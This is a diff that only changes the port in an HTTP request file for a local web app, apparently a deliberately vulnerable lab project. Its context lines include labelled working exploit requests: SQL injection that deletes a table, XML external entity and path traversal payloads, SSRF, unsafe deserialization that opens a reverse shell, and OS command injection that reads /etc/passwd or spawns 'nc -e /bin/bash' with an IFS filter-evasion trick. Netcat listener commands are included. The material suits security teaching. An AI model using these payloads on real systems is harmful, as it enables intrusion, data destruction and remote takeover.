@@ -1,6 +1,6 @@
 ### LOGIN AS ADMIN
 POST /api/sessions HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -10,7 +10,7 @@ Content-Type: application/json
 }
 ### LOGIN AS ADMIN
 POST /api/sessions HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -20,7 +20,7 @@ Content-Type: application/json
 }
 ###REGISTER USING EVIL REGEX
 POST /api/register HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -31,7 +31,7 @@ Content-Type: application/json
 }
 ###REGISTER MALICIOUS USER
 POST /api/register HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -42,7 +42,7 @@ Content-Type: application/json
 }
 ### LOGIN AS USER
 POST /api/sessions HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -51,19 +51,19 @@ Content-Type: application/json
 }
 ### LOGOUT
 DELETE /api/sessions/current HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 ###
 GET /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 ###
 GET /api/pages/1 HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 ###
 GET /api/pages/15; DELETE FROM pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 ###
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -86,7 +86,7 @@ Content-Type: application/json
 }
 ###
 PUT /api/pages/1 HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -112,13 +112,13 @@ Content-Type: application/json
 }
 ###
 DELETE /api/pages/2
-Host: localhost:3001
+Host: localhost:3002
 ###
 GET /api/website/name
-Host: localhost:3001
+Host: localhost:3002
 ###
 PUT /api/website/name
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: application/json
 
 {
@@ -126,16 +126,16 @@ Content-Type: application/json
 }
 ###
 GET /api/users
-Host: localhost:3001
+Host: localhost:3002
 ###
 GET /api/images
-Host: localhost:3001
+Host: localhost:3002
 ###
 GET /api/images?search=landscape
-Host: localhost:3001
+Host: localhost:3002
 ### Exploit: XML External Entities
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -146,7 +146,7 @@ Content-Type: text/xml
 </page>
 ### Exploit: Unsafe deserialization (ls /)
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -158,7 +158,7 @@ Content-Type: text/xml
 ### Exploit: Unsafe deserialization (reverse shell)
 # The attacker's machine must have netcat listening: nc -lvp 4242
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -169,7 +169,7 @@ Content-Type: text/xml
 </page>
 ### Exploit: Path traversal
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -180,7 +180,7 @@ Content-Type: text/xml
 </page>
 ### Exploit: Path traversal 2 (Image is considered valid but it's not shown in the frontend)
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -192,7 +192,7 @@ Content-Type: text/xml
 ### Exploit: SSRF
 # We suppose that there is another server active on port 8080, not accessible from the Internet
 POST /api/pages HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 Content-Type: text/xml
 
 <?xml version='1.0'?>
@@ -205,10 +205,10 @@ Content-Type: text/xml
 # Search query: 'shownoresults";cat${IFS%??}/etc/passwd;echo${IFS%??}-n${IFS%??}"'
 # ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
 GET /api/images?search=shownoresults%22%3Bcat%24%7BIFS%25%3F%3F%7D/etc/passwd%3Becho%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D%22 HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
 ### Exploit: OS command injection (reverse shell)
 # Search query: '";nc${IFS%??}-e${IFS%??}/bin/bash${IFS%??}127.0.0.1${IFS%??}4242;echo${IFS%??}"'
 # ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
 # The attacker's machine must have netcat listening: nc -lvp 4242
 GET /api/images?search=%22%3Bnc%24%7BIFS%25%3F%3F%7D-e%24%7BIFS%25%3F%3F%7D%2Fbin%2Fbash%24%7BIFS%25%3F%3F%7D127.0.0.1%24%7BIFS%25%3F%3F%7D4242%3Becho%24%7BIFS%25%3F%3F%7D%22 HTTP/1.1
-Host: localhost:3001
+Host: localhost:3002
